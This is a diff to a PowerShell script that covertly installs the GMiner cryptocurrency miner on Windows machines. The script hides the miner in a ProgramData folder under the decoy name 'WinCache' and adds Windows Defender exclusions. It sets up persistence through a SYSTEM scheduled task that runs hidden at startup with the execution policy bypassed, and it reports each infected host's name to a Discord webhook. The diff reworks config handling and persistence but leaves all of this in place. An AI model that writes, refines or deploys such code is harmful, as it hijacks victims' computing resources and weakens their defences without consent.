@@ -1,7 +1,7 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Deploys and runs GMiner from a hidden system folder with logon auto-start.
+    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
@@ -28,13 +28,13 @@ param(
 $ErrorActionPreference = 'Stop'
 
 # ---------- paths -----------------------------------------------------------
-$Root    = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
-$LogDir  = Join-Path $Root 'logs'
-$CfgPath = Join-Path $Root 'config.json'
-$ExePath = Join-Path $Root 'WinCache.exe'
-$SelfPs  = Join-Path $Root 'WinCache.ps1'
-$LogFile = Join-Path $LogDir 'miner.log'
+$Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
+$LogDir   = Join-Path $Root 'logs'
+$ExePath  = Join-Path $Root 'WinCache.exe'
+$SelfPs   = Join-Path $Root 'WinCache.ps1'
+$LogFile  = Join-Path $LogDir 'miner.log'
 $TaskName = 'WinCacheAgent'
+
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
@@ -93,39 +93,23 @@ if ($Diagnose) {
     Line 'Root'        $Root
     Line 'Exists'      (Test-Path $Root)
     Line 'Hidden'      (if (Test-Path $Root) { ((Get-Item $Root -Force).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0 } else { 'n/a' })
-    Line 'config.json' (Test-Path $CfgPath)
     Line 'WinCache.exe'(Test-Path $ExePath)
     Line 'WinCache.ps1'(Test-Path $SelfPs)
     Line 'miner.log'   $LogFile
-
-    Section 'Config'
-    if (Test-Path $CfgPath) {
-        $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
-        Line 'wallet'   $cfg.wallet
-        Line 'pool'     $cfg.pool
-        Line 'algo'     $cfg.algo
-        Line 'worker'   $cfg.worker
-        Line 'webhook'  (if ($cfg.discordWebhook) { $cfg.discordWebhook.Substring(0, [Math]::Min(60,$cfg.discordWebhook.Length)) + '...' } else { '(vacío)' })
-    } else {
-        Write-Host '  config.json no existe.' -ForegroundColor Yellow
-    }
 
     Section 'Scheduled Task'
     $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     if ($task) {
         Line 'Task Name' $task.TaskName
         Line 'State'     $task.State
+        $taskArgs = $task.Actions.Arguments
+        if ($taskArgs.Length -gt 100) {
+            Line 'Arguments' ($taskArgs.Substring(0, 100) + '... [truncado]')
+        } else {
+            Line 'Arguments' $taskArgs
+        }
     } else {
         Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
-    }
-
-    Section 'Startup folder (Legacy)'
-    $startup = [Environment]::GetFolderPath('Startup')
-    $entries = Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue
-    if ($entries) {
-        foreach ($e in $entries) { Line $e.Name $e.FullName }
-    } else {
-        Write-Host '  No hay entradas legacy en Startup.' -ForegroundColor Green
     }
 
     Section 'Defender exclusions'
@@ -144,7 +128,7 @@ if ($Diagnose) {
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
     if ($watchers) {
         foreach ($w in $watchers) {
-            Line "Watcher PID $($w.ProcessId)" ($w.CommandLine.Substring(0, [Math]::Min(90,$w.CommandLine.Length)))
+            Line "Watcher PID $($w.ProcessId)" "PowerShell corriendo con -Run"
         }
     } else {
         Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
@@ -196,10 +180,8 @@ if ($Uninstall) {
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
         ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     
-    # Remove Scheduled Task
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
     
-    # Clean legacy startup folder items
     $startup = [Environment]::GetFolderPath('Startup')
     Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
     
@@ -208,7 +190,7 @@ if ($Uninstall) {
         Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
     } catch {}
     
-    Write-Host '[+] Miner stopped, scheduled task removed, startup entries cleared, exclusions cleared.'
+    Write-Host '[+] Miner stopped, scheduled task removed, exclusions cleared.'
     Write-Host "[*] Files remain at: $Root"
     return
 }
@@ -216,12 +198,12 @@ if ($Uninstall) {
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
-    if (-not (Test-Path $CfgPath)) {
-        Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] config missing: $CfgPath"
+    
+    # Verificación de parámetros inyectados por el Programador de Tareas
+    if (-not $Wallet -or -not $Pool -or -not $Algo) {
+        Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] CRITICAL: Faltan argumentos Wallet/Pool/Algo en -Run"
         exit 1
     }
-    $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
-    $webhook = if ($DiscordWebhook) { $DiscordWebhook } else { $cfg.discordWebhook }
 
     function Write-Session {
         param([string]$Msg, [string]$Level = 'INFO')
@@ -231,14 +213,15 @@ if ($Run) {
 
     $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
     $warnRe  = 'connection (refused|reset|closed|timed? ?out)|cannot connect|cuda error'
-    $maxRestarts  = if ($cfg.max_restarts)  { [int]$cfg.max_restarts }  else { 10 }
-    $restartDelay = if ($cfg.restart_delay) { [int]$cfg.restart_delay } else { 30 }
-    $argStr = "--algo $($cfg.algo) --server $($cfg.pool) --user $($cfg.wallet).$($cfg.worker)"
+    
+    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"
 
     Write-Session "===== watcher started (pid $PID) ====="
-    Write-Session "exe=$ExePath  pool=$($cfg.pool)  algo=$($cfg.algo)  worker=$($cfg.worker)"
+    Write-Session "exe=$ExePath  pool=$Pool  algo=$Algo  worker=$Worker"
 
     $restarts = 0
+    $maxRestarts = 10
+    $restartDelay = 30
     $notifiedStart = $false
 
     while ($true) {
@@ -257,14 +240,14 @@ if ($Run) {
         $proc.StartInfo = $psi
         try {
             $proc.Start() | Out-Null
-            if (-not $notifiedStart -and $webhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $($cfg.worker)`nPool: $($cfg.pool)`nAlgo: $($cfg.algo)"
-                Send-DiscordWebhook -WebhookUrl $webhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
+            if (-not $notifiedStart -and $DiscordWebhook) {
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo"
+                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
         } catch {
             Write-Session "failed to start miner: $_" 'FATAL'
-            if ($webhook) { Send-DiscordWebhook -WebhookUrl $webhook -Title "❌ Miner Failed to Start" -Message "Error: $_" -Color 15158332 | Out-Null }
+            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "❌ Miner Failed to Start" -Message "Error: $_" -Color 15158332 | Out-Null }
             break
         }
 
@@ -305,7 +288,7 @@ if ($Run) {
         $restarts++
         if ($restarts -ge $maxRestarts) {
             Write-Session "max restarts ($maxRestarts) reached, stopping" 'FATAL'
-            if ($webhook) { Send-DiscordWebhook -WebhookUrl $webhook -Title "⚠️ Miner Stopped" -Message "Max restarts ($maxRestarts) reached." -Color 15158332 | Out-Null }
+            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "⚠️ Miner Stopped" -Message "Max restarts ($maxRestarts) reached." -Color 15158332 | Out-Null }
             break
         }
         Write-Session "restarting in ${restartDelay}s"
@@ -363,38 +346,17 @@ if (-not (Test-Path $ExePath)) {
     Write-Host '[=] WinCache.exe present'
 }
 
-# ---------- config ----------------------------------------------------------
-if ($Wallet -and $Pool -and $Algo) {
-    if ([string]::IsNullOrWhiteSpace($Worker)) {
-        $sha = [System.Security.Cryptography.SHA256]::Create()
-        try {
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
-            $hash  = $sha.ComputeHash($bytes)
-        } finally {
-            $sha.Dispose()
-        }
-        $shortHash = [System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower()
-        $Worker = "rig_$shortHash"
+# ---------- worker hash -----------------------------------------------------
+if ([string]::IsNullOrWhiteSpace($Worker)) {
+    $sha = [System.Security.Cryptography.SHA256]::Create()
+    try {
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
+        $hash  = $sha.ComputeHash($bytes)
+    } finally {
+        $sha.Dispose()
     }
-    $cfg = [ordered]@{
-        wallet         = $Wallet
-        pool           = $Pool
-        algo           = $Algo
-        worker         = $Worker
-        discordWebhook = $DiscordWebhook
-        max_restarts   = 10
-        restart_delay  = 30
-        installed_at   = (Get-Date -Format 's')
-    }
-    $cfg | ConvertTo-Json | Set-Content -Path $CfgPath -Encoding UTF8
-    Write-Host "[+] Config: $CfgPath"
-} elseif (-not (Test-Path $CfgPath)) {
-    throw 'First run requires -Wallet, -Pool, and -Algo.'
-} else {
-    Write-Host '[=] Using existing config'
-    $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
-    if ([string]::IsNullOrWhiteSpace($Worker)) { $Worker = $cfg.worker }
-    if ([string]::IsNullOrWhiteSpace($DiscordWebhook) -and $cfg.discordWebhook) { $DiscordWebhook = $cfg.discordWebhook }
+    $shortHash = [System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower()
+    $Worker = "rig_$shortHash"
 }
 
 # ---------- install self (con validación) -----------------------------------
@@ -411,28 +373,23 @@ if ($scriptPath -ne $SelfPs) {
 }
 
 # ---------- scheduled task --------------------------------------------------
-Write-Host '[*] Registrando tarea programada de inicio...'
+Write-Host '[*] Registrando tarea programada con parámetros inyectados...'
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-$psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Run -NoElevate"
-$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArgs
+# Construimos la línea de argumentos completa
+$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
+if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
+$argList += " -Run -NoElevate"
+
+$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-
-# Se ejecuta como SYSTEM para evitar UAC y arrancar antes del login
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Mantenimiento en segundo plano de WinCache" | Out-Null
 Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"
 
-# Limpieza de versiones anteriores (VBS / BAT)
-$startup = [Environment]::GetFolderPath('Startup')
-$oldVbs = Join-Path $startup 'WinCache.vbs'
-$oldBat = Join-Path $startup 'WinCache.bat'
-if (Test-Path $oldVbs) { Remove-Item $oldVbs -Force -ErrorAction SilentlyContinue }
-if (Test-Path $oldBat) { Remove-Item $oldBat -Force -ErrorAction SilentlyContinue }
-
-# ---------- launch watcher --------------------------------------------------
+# ---------- launch watcher (ahora mismo) ------------------------------------
 Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
@@ -440,9 +397,9 @@ Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorA
 
 $p = $null
 if ($Foreground) {
-    & $SelfPs -Run -NoElevate
+    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
 } else {
-    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psArgs -WindowStyle Hidden -PassThru
+    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
     Write-Host "[+] Watcher running (pid $($p.Id))"
 }
 
